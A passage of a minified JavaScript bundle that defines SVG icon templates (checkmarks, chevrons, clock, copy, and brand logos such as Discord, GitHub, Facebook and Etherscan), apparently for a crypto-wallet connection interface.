9.44041 3.64324C9.39242 3.60837 9.30031 3.56034 9.03362 3.53145C8.75288 3.50103 8.37876 3.5 7.79961 3.5H4.19968C3.62053 3.5 3.24641 3.50103 2.96567 3.53145ZM9.74956 6.20832H2.24973V7.55C2.24973 8.12917 2.25076 8.5033 2.28117 8.78404C2.31007 9.05074 2.35809 9.14285 2.39296 9.19084C2.43922 9.25451 2.49521 9.31051 2.55888 9.35677C2.60687 9.39163 2.69897 9.43966 2.96567 9.46856C3.24641 9.49897 3.62053 9.5 4.19968 9.5H7.79961C8.37876 9.5 8.75288 9.49897 9.03362 9.46856C9.30032 9.43966 9.39242 9.39163 9.44041 9.35677C9.50408 9.31051 9.56007 9.25451 9.60633 9.19084C9.6412 9.14285 9.68922 9.05075 9.71812 8.78404C9.74854 8.5033 9.74956 8.12917 9.74956 7.55V6.20832ZM6.74963 8C6.74963 7.58579 7.08541 7.25 7.49961 7.25H8.2496C8.6638 7.25 8.99958 7.58579 8.99958 8C8.99958 8.41422 8.6638 8.75 8.2496 8.75H7.49961C7.08541 8.75 6.74963 8.41422 6.74963 8Z"
    fill="currentColor"
  /></svg
>`;var eJ=Object.freeze({__proto__:null,cardSvg:XZ});const tJ=re`<svg
  width="28"
  height="28"
  viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M25.5297 4.92733C26.1221 5.4242 26.1996 6.30724 25.7027 6.89966L12.2836 22.8997C12.0316 23.2001 11.6652 23.3811 11.2735 23.3986C10.8817 23.4161 10.5006 23.2686 10.2228 22.9919L2.38218 15.1815C1.83439 14.6358 1.83268 13.7494 2.37835 13.2016C2.92403 12.6538 3.81046 12.6521 4.35825 13.1978L11.1183 19.9317L23.5573 5.10036C24.0542 4.50794 24.9372 4.43047 25.5297 4.92733Z"
    fill="currentColor"/>
</svg>
`;var rJ=Object.freeze({__proto__:null,checkmarkSvg:tJ});const nJ=re`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M12.9576 2.23383C13.3807 2.58873 13.4361 3.21947 13.0812 3.64263L6.37159 11.6426C6.19161 11.8572 5.92989 11.9865 5.65009 11.999C5.3703 12.0115 5.09808 11.9062 4.89965 11.7085L0.979321 7.80331C0.588042 7.41354 0.586817 6.78038 0.976585 6.3891C1.36635 5.99782 1.99952 5.99659 2.3908 6.38636L5.53928 9.52268L11.5488 2.35742C11.9037 1.93426 12.5344 1.87893 12.9576 2.23383Z"
    clip-rule="evenodd"
  />
</svg>`;var iJ=Object.freeze({__proto__:null,checkmarkBoldSvg:nJ});const sJ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M1.46 4.96a1 1 0 0 1 1.41 0L8 10.09l5.13-5.13a1 1 0 1 1 1.41 1.41l-5.83 5.84a1 1 0 0 1-1.42 0L1.46 6.37a1 1 0 0 1 0-1.41Z"
    clip-rule="evenodd"
  />
</svg>`;var oJ=Object.freeze({__proto__:null,chevronBottomSvg:sJ});const aJ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M11.04 1.46a1 1 0 0 1 0 1.41L5.91 8l5.13 5.13a1 1 0 1 1-1.41 1.41L3.79 8.71a1 1 0 0 1 0-1.42l5.84-5.83a1 1 0 0 1 1.41 0Z"
    clip-rule="evenodd"
  />
</svg>`;var cJ=Object.freeze({__proto__:null,chevronLeftSvg:aJ});const lJ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.96 14.54a1 1 0 0 1 0-1.41L10.09 8 4.96 2.87a1 1 0 0 1 1.41-1.41l5.84 5.83a1 1 0 0 1 0 1.42l-5.84 5.83a1 1 0 0 1-1.41 0Z"
    clip-rule="evenodd"
  />
</svg>`;var uJ=Object.freeze({__proto__:null,chevronRightSvg:lJ});const hJ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M14.54 11.04a1 1 0 0 1-1.41 0L8 5.92l-5.13 5.12a1 1 0 1 1-1.41-1.41l5.83-5.84a1 1 0 0 1 1.42 0l5.83 5.84a1 1 0 0 1 0 1.41Z"
    clip-rule="evenodd"
  />
</svg>`;var dJ=Object.freeze({__proto__:null,chevronTopSvg:hJ});const fJ=re`<svg width="36" height="36" fill="none">
  <path
    fill="#fff"
    fill-opacity=".05"
    d="M0 14.94c0-5.55 0-8.326 1.182-10.4a9 9 0 0 1 3.359-3.358C6.614 0 9.389 0 14.94 0h6.12c5.55 0 8.326 0 10.4 1.182a9 9 0 0 1 3.358 3.359C36 6.614 36 9.389 36 14.94v6.12c0 5.55 0 8.326-1.182 10.4a9 9 0 0 1-3.359 3.358C29.386 36 26.611 36 21.06 36h-6.12c-5.55 0-8.326 0-10.4-1.182a9 9 0 0 1-3.358-3.359C0 29.386 0 26.611 0 21.06v-6.12Z"
  />
  <path
    stroke="#fff"
    stroke-opacity=".05"
    d="M14.94.5h6.12c2.785 0 4.84 0 6.46.146 1.612.144 2.743.43 3.691.97a8.5 8.5 0 0 1 3.172 3.173c.541.948.826 2.08.971 3.692.145 1.62.146 3.675.146 6.459v6.12c0 2.785 0 4.84-.146 6.46-.145 1.612-.43 2.743-.97 3.691a8.5 8.5 0 0 1-3.173 3.172c-.948.541-2.08.826-3.692.971-1.62.145-3.674.146-6.459.146h-6.12c-2.784 0-4.84 0-6.46-.146-1.612-.145-2.743-.43-3.691-.97a8.5 8.5 0 0 1-3.172-3.173c-.541-.948-.827-2.08-.971-3.692C.5 25.9.5 23.845.5 21.06v-6.12c0-2.784 0-4.84.146-6.46.144-1.612.43-2.743.97-3.691A8.5 8.5 0 0 1 4.79 1.617C5.737 1.076 6.869.79 8.48.646 10.1.5 12.156.5 14.94.5Z"
  />
  <path
    fill="url(#a)"
    d="M17.998 10.8h12.469a14.397 14.397 0 0 0-24.938.001l6.234 10.798.006-.001a7.19 7.19 0 0 1 6.23-10.799Z"
  />
  <path
    fill="url(#b)"
    d="m24.237 21.598-6.234 10.798A14.397 14.397 0 0 0 30.47 10.798H18.002l-.002.006a7.191 7.191 0 0 1 6.237 10.794Z"
  />
  <path
    fill="url(#c)"
    d="M11.765 21.601 5.531 10.803A14.396 14.396 0 0 0 18.001 32.4l6.235-10.798-.004-.004a7.19 7.19 0 0 1-12.466.004Z"
  />
  <path fill="#fff" d="M18 25.2a7.2 7.2 0 1 0 0-14.4 7.2 7.2 0 0 0 0 14.4Z" />
  <path fill="#1A73E8" d="M18 23.7a5.7 5.7 0 1 0 0-11.4 5.7 5.7 0 0 0 0 11.4Z" />
  <defs>
    <linearGradient
      id="a"
      x1="6.294"
      x2="41.1"
      y1="5.995"
      y2="5.995"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#D93025" />
      <stop offset="1" stop-color="#EA4335" />
    </linearGradient>
    <linearGradient
      id="b"
      x1="20.953"
      x2="37.194"
      y1="32.143"
      y2="2.701"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#FCC934" />
      <stop offset="1" stop-color="#FBBC04" />
    </linearGradient>
    <linearGradient
      id="c"
      x1="25.873"
      x2="9.632"
      y1="31.2"
      y2="1.759"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#1E8E3E" />
      <stop offset="1" stop-color="#34A853" />
    </linearGradient>
  </defs>
</svg>`;var pJ=Object.freeze({__proto__:null,chromeStoreSvg:fJ});const gJ=re`<svg width="14" height="14" viewBox="0 0 14 14" fill="none">
  <path 
    fill-rule="evenodd" 
    clip-rule="evenodd" 
    d="M7.00235 2C4.24 2 2.00067 4.23858 2.00067 7C2.00067 9.76142 4.24 12 7.00235 12C9.7647 12 12.004 9.76142 12.004 7C12.004 4.23858 9.7647 2 7.00235 2ZM0 7C0 3.13401 3.13506 0 7.00235 0C10.8696 0 14.0047 3.13401 14.0047 7C14.0047 10.866 10.8696 14 7.00235 14C3.13506 14 0 10.866 0 7ZM7.00235 3C7.55482 3 8.00269 3.44771 8.00269 4V6.58579L9.85327 8.43575C10.2439 8.82627 10.2439 9.45944 9.85327 9.84996C9.46262 10.2405 8.82924 10.2405 8.43858 9.84996L6.29501 7.70711C6.10741 7.51957 6.00201 7.26522 6.00201 7V4C6.00201 3.44771 6.44988 3 7.00235 3Z" 
    fill="currentColor"
  />
</svg>`;var wJ=Object.freeze({__proto__:null,clockSvg:gJ});const mJ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z"
    clip-rule="evenodd"
  />
</svg>`;var yJ=Object.freeze({__proto__:null,closeSvg:mJ});const bJ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M8 2a6 6 0 1 0 0 12A6 6 0 0 0 8 2ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm10.66-2.65a1 1 0 0 1 .23 1.06L9.83 9.24a1 1 0 0 1-.59.58l-2.83 1.06A1 1 0 0 1 5.13 9.6l1.06-2.82a1 1 0 0 1 .58-.59L9.6 5.12a1 1 0 0 1 1.06.23ZM7.9 7.89l-.13.35.35-.13.12-.35-.34.13Z"
    clip-rule="evenodd"
  />
</svg>`;var vJ=Object.freeze({__proto__:null,compassSvg:bJ});const EJ=re`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10 3a7 7 0 0 0-6.85 8.44l8.29-8.3C10.97 3.06 10.49 3 10 3Zm3.49.93-9.56 9.56c.32.55.71 1.06 1.16 1.5L15 5.1a7.03 7.03 0 0 0-1.5-1.16Zm2.7 2.8-9.46 9.46a7 7 0 0 0 9.46-9.46ZM1.99 5.9A9 9 0 1 1 18 14.09 9 9 0 0 1 1.98 5.91Z"
    clip-rule="evenodd"
  />
</svg>`;var CJ=Object.freeze({__proto__:null,coinPlaceholderSvg:EJ});const AJ=re`<svg
  xmlns="http://www.w3.org/2000/svg"
  width="16"
  height="16"
  viewBox="0 0 16 16"
  fill="none"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M9.21498 1.28565H10.5944C11.1458 1.28562 11.6246 1.2856 12.0182 1.32093C12.4353 1.35836 12.853 1.44155 13.2486 1.66724C13.7005 1.92498 14.0749 2.29935 14.3326 2.75122C14.5583 3.14689 14.6415 3.56456 14.6789 3.9817C14.7143 4.37531 14.7142 4.85403 14.7142 5.40545V6.78489C14.7142 7.33631 14.7143 7.81503 14.6789 8.20865C14.6415 8.62578 14.5583 9.04345 14.3326 9.43912C14.0749 9.89099 13.7005 10.2654 13.2486 10.5231C12.853 10.7488 12.4353 10.832 12.0182 10.8694C11.7003 10.8979 11.3269 10.9034 10.9045 10.9045C10.9034 11.3269 10.8979 11.7003 10.8694 12.0182C10.832 12.4353 10.7488 12.853 10.5231 13.2486C10.2654 13.7005 9.89099 14.0749 9.43912 14.3326C9.04345 14.5583 8.62578 14.6415 8.20865 14.6789C7.81503 14.7143 7.33631 14.7142 6.78489 14.7142H5.40545C4.85403 14.7142 4.37531 14.7143 3.9817 14.6789C3.56456 14.6415 3.14689 14.5583 2.75122 14.3326C2.29935 14.0749 1.92498 13.7005 1.66724 13.2486C1.44155 12.853 1.35836 12.4353 1.32093 12.0182C1.2856 11.6246 1.28562 11.1458 1.28565 10.5944V9.21498C1.28562 8.66356 1.2856 8.18484 1.32093 7.79122C1.35836 7.37409 1.44155 6.95642 1.66724 6.56074C1.92498 6.10887 2.29935 5.73451 2.75122 5.47677C3.14689 5.25108 3.56456 5.16789 3.9817 5.13045C4.2996 5.10192 4.67301 5.09645 5.09541 5.09541C5.09645 4.67302 5.10192 4.2996 5.13045 3.9817C5.16789 3.56456 5.25108 3.14689 5.47676 2.75122C5.73451 2.29935 6.10887 1.92498 6.56074 1.66724C6.95642 1.44155 7.37409 1.35836 7.79122 1.32093C8.18484 1.2856 8.66356 1.28562 9.21498 1.28565ZM5.09541 7.09552C4.68397 7.09667 4.39263 7.10161 4.16046 7.12245C3.88053 7.14757 3.78516 7.18949 3.74214 7.21403C3.60139 7.29431 3.48478 7.41091 3.4045 7.55166C3.37997 7.59468 3.33804 7.69005 3.31292 7.96999C3.28659 8.26345 3.28565 8.65147 3.28565 9.25708V10.5523C3.28565 11.1579 3.28659 11.5459 3.31292 11.8394C3.33804 12.1193 3.37997 12.2147 3.4045 12.2577C3.48478 12.3985 3.60139 12.5151 3.74214 12.5954C3.78516 12.6199 3.88053 12.6618 4.16046 12.6869C4.45393 12.7133 4.84195 12.7142 5.44755 12.7142H6.74279C7.3484 12.7142 7.73641 12.7133 8.02988 12.6869C8.30981 12.6618 8.40518 12.6199 8.44821 12.5954C8.58895 12.5151 8.70556 12.3985 8.78584 12.2577C8.81038 12.2147 8.8523 12.1193 8.87742 11.8394C8.89825 11.6072 8.90319 11.3159 8.90435 10.9045C8.48219 10.9034 8.10898 10.8979 7.79122 10.8694C7.37409 10.832 6.95641 10.7488 6.56074 10.5231C6.10887 10.2654 5.73451 9.89099 5.47676 9.43912C5.25108 9.04345 5.16789 8.62578 5.13045 8.20865C5.10194 7.89089 5.09645 7.51767 5.09541 7.09552ZM7.96999 3.31292C7.69005 3.33804 7.59468 3.37997 7.55166 3.4045C7.41091 3.48478 7.29431 3.60139 7.21403 3.74214C7.18949 3.78516 7.14757 3.88053 7.12245 4.16046C7.09611 4.45393 7.09517 4.84195 7.09517 5.44755V6.74279C7.09517 7.3484 7.09611 7.73641 7.12245 8.02988C7.14757 8.30981 7.18949 8.40518 7.21403 8.4482C7.29431 8.58895 7.41091 8.70556 7.55166 8.78584C7.59468 8.81038 7.69005 8.8523 7.96999 8.87742C8.26345 8.90376 8.65147 8.9047 9.25708 8.9047H10.5523C11.1579 8.9047 11.5459 8.90376 11.8394 8.87742C12.1193 8.8523 12.2147 8.81038 12.2577 8.78584C12.3985 8.70556 12.5151 8.58895 12.5954 8.4482C12.6199 8.40518 12.6618 8.30981 12.6869 8.02988C12.7133 7.73641 12.7142 7.3484 12.7142 6.74279V5.44755C12.7142 4.84195 12.7133 4.45393 12.6869 4.16046C12.6618 3.88053 12.6199 3.78516 12.5954 3.74214C12.5151 3.60139 12.3985 3.48478 12.2577 3.4045C12.2147 3.37997 12.1193 3.33804 11.8394 3.31292C11.5459 3.28659 11.1579 3.28565 10.5523 3.28565H9.25708C8.65147 3.28565 8.26345 3.28659 7.96999 3.31292Z"
    fill="#788181"
  /></svg
>`;var xJ=Object.freeze({__proto__:null,copySvg:AJ});const IJ=re` <svg fill="none" viewBox="0 0 13 4">
  <path fill="currentColor" d="M.5 0h12L8.9 3.13a3.76 3.76 0 0 1-4.8 0L.5 0Z" />
</svg>`;var SJ=Object.freeze({__proto__:null,cursorSvg:IJ});const NJ=re`<svg fill="none" viewBox="0 0 14 6">
  <path style="fill: var(--wui-color-bg-150);" d="M0 1h14L9.21 5.12a3.31 3.31 0 0 1-4.49 0L0 1Z" />
  <path
    style="stroke: var(--wui-color-inverse-100);"
    stroke-opacity=".05"
    d="M1.33 1.5h11.32L8.88 4.75l-.01.01a2.81 2.81 0 0 1-3.8 0l-.02-.01L1.33 1.5Z"
  />
  <path
    style="fill: var(--wui-color-bg-150);"
    d="M1.25.71h11.5L9.21 3.88a3.31 3.31 0 0 1-4.49 0L1.25.71Z"
  />
</svg> `;var PJ=Object.freeze({__proto__:null,cursorTransparentSvg:NJ});const kJ=re`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M13.66 2H6.34c-1.07 0-1.96 0-2.68.08-.74.08-1.42.25-2.01.68a4 4 0 0 0-.89.89c-.43.6-.6 1.27-.68 2.01C0 6.38 0 7.26 0 8.34v.89c0 1.07 0 1.96.08 2.68.08.74.25 1.42.68 2.01a4 4 0 0 0 .89.89c.6.43 1.27.6 2.01.68a27 27 0 0 0 2.68.08h7.32a27 27 0 0 0 2.68-.08 4.03 4.03 0 0 0 2.01-.68 4 4 0 0 0 .89-.89c.43-.6.6-1.27.68-2.01.08-.72.08-1.6.08-2.68v-.89c0-1.07 0-1.96-.08-2.68a4.04 4.04 0 0 0-.68-2.01 4 4 0 0 0-.89-.89c-.6-.43-1.27-.6-2.01-.68C15.62 2 14.74 2 13.66 2ZM2.82 4.38c.2-.14.48-.25 1.06-.31C4.48 4 5.25 4 6.4 4h7.2c1.15 0 1.93 0 2.52.07.58.06.86.17 1.06.31a2 2 0 0 1 .44.44c.14.2.25.48.31 1.06.07.6.07 1.37.07 2.52v.77c0 1.15 0 1.93-.07 2.52-.06.58-.17.86-.31 1.06a2 2 0 0 1-.44.44c-.2.14-.48.25-1.06.32-.6.06-1.37.06-2.52.06H6.4c-1.15 0-1.93 0-2.52-.06-.58-.07-.86-.18-1.06-.32a2 2 0 0 1-.44-.44c-.14-.2-.25-.48-.31-1.06C2 11.1 2 10.32 2 9.17V8.4c0-1.15 0-1.93.07-2.52.06-.58.17-.86.31-1.06a2 2 0 0 1 .44-.44Z"
    clip-rule="evenodd"
  />
  <path fill="currentColor" d="M6.14 17.57a1 1 0 1 0 0 2h7.72a1 1 0 1 0 0-2H6.14Z" />
</svg>`;var OJ=Object.freeze({__proto__:null,desktopSvg:kJ});const _J=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.07 1h.57a1 1 0 0 1 0 2h-.52c-.98 0-1.64 0-2.14.06-.48.05-.7.14-.84.24-.13.1-.25.22-.34.35-.1.14-.2.35-.25.83-.05.5-.05 1.16-.05 2.15v2.74c0 .99 0 1.65.05 2.15.05.48.14.7.25.83.1.14.2.25.34.35.14.1.36.2.84.25.5.05 1.16.05 2.14.05h.52a1 1 0 0 1 0 2h-.57c-.92 0-1.69 0-2.3-.07a3.6 3.6 0 0 1-1.8-.61c-.3-.22-.57-.49-.8-.8a3.6 3.6 0 0 1-.6-1.79C.5 11.11.5 10.35.5 9.43V6.58c0-.92 0-1.7.06-2.31a3.6 3.6 0 0 1 .62-1.8c.22-.3.48-.57.79-.79a3.6 3.6 0 0 1 1.8-.61C4.37 1 5.14 1 6.06 1ZM9.5 3a1 1 0 0 1 1.42 0l4.28 4.3a1 1 0 0 1 0 1.4L10.93 13a1 1 0 0 1-1.42-1.42L12.1 9H6.8a1 1 0 1 1 0-2h5.3L9.51 4.42a1 1 0 0 1 0-1.41Z"
    clip-rule="evenodd"
  />
</svg>`;var TJ=Object.freeze({__proto__:null,disconnectSvg:_J});const $J=re`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5865F2" />
      <path
        fill="#fff"
        fill-rule="evenodd"
        d="M25.71 28.15C30.25 28 32 25.02 32 25.02c0-6.61-2.96-11.98-2.96-11.98-2.96-2.22-5.77-2.15-5.77-2.15l-.29.32c3.5 1.07 5.12 2.61 5.12 2.61a16.75 16.75 0 0 0-10.34-1.93l-.35.04a15.43 15.43 0 0 0-5.88 1.9s1.71-1.63 5.4-2.7l-.2-.24s-2.81-.07-5.77 2.15c0 0-2.96 5.37-2.96 11.98 0 0 1.73 2.98 6.27 3.13l1.37-1.7c-2.6-.79-3.6-2.43-3.6-2.43l.58.35.09.06.08.04.02.01.08.05a17.25 17.25 0 0 0 4.52 1.58 14.4 14.4 0 0 0 8.3-.86c.72-.27 1.52-.66 2.37-1.21 0 0-1.03 1.68-3.72 2.44.61.78 1.35 1.67 1.35 1.67Zm-9.55-9.6c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28.01-1.25-.93-2.28-2.1-2.28Zm7.5 0c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28 0-1.25-.93-2.28-2.1-2.28Z"
        clip-rule="evenodd"
      />
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
  </defs>
</svg>`;var RJ=Object.freeze({__proto__:null,discordSvg:$J});const DJ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="M4.25 7a.63.63 0 0 0-.63.63v3.97c0 .28-.2.51-.47.54l-.75.07a.93.93 0 0 1-.9-.47A7.51 7.51 0 0 1 5.54.92a7.5 7.5 0 0 1 9.54 4.62c.12.35.06.72-.16 1-.74.97-1.68 1.78-2.6 2.44V4.44a.64.64 0 0 0-.63-.64h-1.06c-.35 0-.63.3-.63.64v5.5c0 .23-.12.42-.32.5l-.52.23V6.05c0-.36-.3-.64-.64-.64H7.45c-.35 0-.64.3-.64.64v4.97c0 .25-.17.46-.4.52a5.8 5.8 0 0 0-.45.11v-4c0-.36-.3-.65-.64-.65H4.25ZM14.07 12.4A7.49 7.49 0 0 1 3.6 14.08c4.09-.58 9.14-2.5 11.87-6.6v.03a7.56 7.56 0 0 1-1.41 4.91Z"
  />
</svg>`;var BJ=Object.freeze({__proto__:null,etherscanSvg:DJ});const LJ=re`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.71 2.99a.57.57 0 0 0-.57.57 1 1 0 0 1-1 1c-.58 0-.96 0-1.24.03-.27.03-.37.07-.42.1a.97.97 0 0 0-.36.35c-.04.08-.09.21-.11.67a2.57 2.57 0 0 1 0 5.13c.02.45.07.6.11.66.09.15.21.28.36.36.07.04.21.1.67.12a2.57 2.57 0 0 1 5.12 0c.46-.03.6-.08.67-.12a.97.97 0 0 0 .36-.36c.03-.04.07-.14.1-.41.02-.29.03-.66.03-1.24a1 1 0 0 1 1-1 .57.57 0 0 0 0-1.15 1 1 0 0 1-1-1c0-.58 0-.95-.03-1.24a1.04 1.04 0 0 0-.1-.42.97.97 0 0 0-.36-.36 1.04 1.04 0 0 0-.42-.1c-.28-.02-.65-.02-1.24-.02a1 1 0 0 1-1-1 .57.57 0 0 0-.57-.57ZM5.15 13.98a1 1 0 0 0 .99-1v-.78a.57.57 0 0 1 1.14 0v.78a1 1 0 0 0 .99 1H8.36a66.26 66.26 0 0 0 .73 0 3.78 3.78 0 0 0 1.84-.38c.46-.26.85-.64 1.1-1.1.23-.4.32-.8.36-1.22.02-.2.03-.4.03-.63a2.57 2.57 0 0 0 0-4.75c0-.23-.01-.44-.03-.63a2.96 2.96 0 0 0-.35-1.22 2.97 2.97 0 0 0-1.1-1.1c-.4-.22-.8-.31-1.22-.35a8.7 8.7 0 0 0-.64-.04 2.57 2.57 0 0 0-4.74 0c-.23 0-.44.02-.63.04-.42.04-.83.13-1.22.35-.46.26-.84.64-1.1 1.1-.33.57-.37 1.2-.39 1.84a21.39 21.39 0 0 0 0 .72v.1a1 1 0 0 0 1 .99h.78a.57.57 0 0 1 0 1.15h-.77a1 1 0 0 0-1 .98v.1a63.87 63.87 0 0 0 0 .73c0 .64.05 1.27.38 1.83.26.47.64.85 1.1 1.11.56.32 1.2.37 1.84.38a20.93 20.93 0 0 0 .72 0h.1Z"
    clip-rule="evenodd"
  />
</svg>`;var UJ=Object.freeze({__proto__:null,extensionSvg:LJ});const MJ=re`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.74 3.99a1 1 0 0 1 1-1H11a1 1 0 0 1 1 1v6.26a1 1 0 0 1-2 0V6.4l-6.3 6.3a1 1 0 0 1-1.4-1.42l6.29-6.3H4.74a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`;var FJ=Object.freeze({__proto__:null,externalLinkSvg:MJ});const zJ=re`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1877F2" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M26 12.38h-2.89c-.92 0-1.61.38-1.61 1.34v1.66H26l-.36 4.5H21.5v12H17v-12h-3v-4.5h3V12.5c0-3.03 1.6-4.62 5.2-4.62H26v4.5Z"
        />
      </g>
    </g>
    <path
      fill="#1877F2"
      d="M40 20a20 20 0 1 0-23.13 19.76V25.78H11.8V20h5.07v-4.4c0-5.02 3-7.79 7.56-7.79 2.19 0 4.48.4 4.48.4v4.91h-2.53c-2.48 0-3.25 1.55-3.25 3.13V20h5.54l-.88 5.78h-4.66v13.98A20 20 0 0 0 40 20Z"
    />
    <path
      fill="#fff"
      d="m27.79 25.78.88-5.78h-5.55v-3.75c0-1.58.78-3.13 3.26-3.13h2.53V8.2s-2.3-.39-4.48-.39c-4.57 0-7.55 2.77-7.55 7.78V20H11.8v5.78h5.07v13.98a20.15 20.15 0 0 0 6.25 0V25.78h4.67Z"
    />
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`;var jJ=Object.freeze({__proto__:null,facebookSvg:zJ});const HJ=re`<svg style="border-radius: 9999px; overflow: hidden;"  fill="none" viewBox="0 0 1000 1000">
  <rect width="1000" height="1000" rx="9999" ry="9999" fill="#855DCD"/>
  <path fill="#855DCD" d="M0 0h1000v1000H0V0Z" />
  <path
    fill="#fff"
    d="M320 248h354v504h-51.96V521.13h-.5c-5.76-63.8-59.31-113.81-124.54-113.81s-118.78 50-124.53 113.81h-.5V752H320V248Z"
  />
  <path
    fill="#fff"
    d="m225 320 21.16 71.46h17.9v289.09a16.29 16.29 0 0 0-16.28 16.24v19.49h-3.25a16.3 16.3 0 0 0-16.28 16.24V752h182.26v-19.48a16.22 16.22 0 0 0-16.28-16.24h-3.25v-19.5a16.22 16.22 0 0 0-16.28-16.23h-19.52V320H225Zm400.3 360.55a16.3 16.3 0 0 0-15.04 10.02 16.2 16.2 0 0 0-1.24 6.22v19.49h-3.25a16.29 16.29 0 0 0-16.27 16.24V752h182.24v-19.48a16.23 16.23 0 0 0-16.27-16.24h-3.25v-19.5a16.2 16.2 0 0 0-10.04-15 16.3 16.3 0 0 0-6.23-1.23v-289.1h17.9L775 320H644.82v360.55H625.3Z"
  />
</svg>`;var qJ=Object.freeze({__proto__:null,farcasterSvg:HJ});const VJ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 3a1 1 0 0 1 1-1h14a1 1 0 1 1 0 2H1a1 1 0 0 1-1-1Zm2.63 5.25a1 1 0 0 1 1-1h8.75a1 1 0 1 1 0 2H3.63a1 1 0 0 1-1-1Zm2.62 5.25a1 1 0 0 1 1-1h3.5a1 1 0 0 1 0 2h-3.5a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`;var WJ=Object.freeze({__proto__:null,filtersSvg:VJ});const GJ=re`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1B1F23" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M8 19.89a12 12 0 1 1 15.8 11.38c-.6.12-.8-.26-.8-.57v-3.3c0-1.12-.4-1.85-.82-2.22 2.67-.3 5.48-1.31 5.48-5.92 0-1.31-.47-2.38-1.24-3.22.13-.3.54-1.52-.12-3.18 0 0-1-.32-3.3 1.23a11.54 11.54 0 0 0-6 0c-2.3-1.55-3.3-1.23-3.3-1.23a4.32 4.32 0 0 0-.12 3.18 4.64 4.64 0 0 0-1.24 3.22c0 4.6 2.8 5.63 5.47 5.93-.34.3-.65.83-.76 1.6-.69.31-2.42.84-3.5-1 0 0-.63-1.15-1.83-1.23 0 0-1.18-.02-.09.73 0 0 .8.37 1.34 1.76 0 0 .7 2.14 4.03 1.41v2.24c0 .31-.2.68-.8.57A12 12 0 0 1 8 19.9Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`;var KJ=Object.freeze({__proto__:null,githubSvg:GJ});const ZJ=re`<svg fill="none" viewBox="0 0 40 40">
  <path
    fill="#4285F4"
    d="M32.74 20.3c0-.93-.08-1.81-.24-2.66H20.26v5.03h7a6 6 0 0 1-2.62 3.91v3.28h4.22c2.46-2.27 3.88-5.6 3.88-9.56Z"
  />
  <path
    fill="#34A853"
    d="M20.26 33a12.4 12.4 0 0 0 8.6-3.14l-4.22-3.28a7.74 7.74 0 0 1-4.38 1.26 7.76 7.76 0 0 1-7.28-5.36H8.65v3.36A12.99 12.99 0 0 0 20.26 33Z"
  />
  <path
    fill="#FBBC05"
    d="M12.98 22.47a7.79 7.79 0 0 1 0-4.94v-3.36H8.65a12.84 12.84 0 0 0 0 11.66l3.37-2.63.96-.73Z"
  />
  <path
    fill="#EA4335"
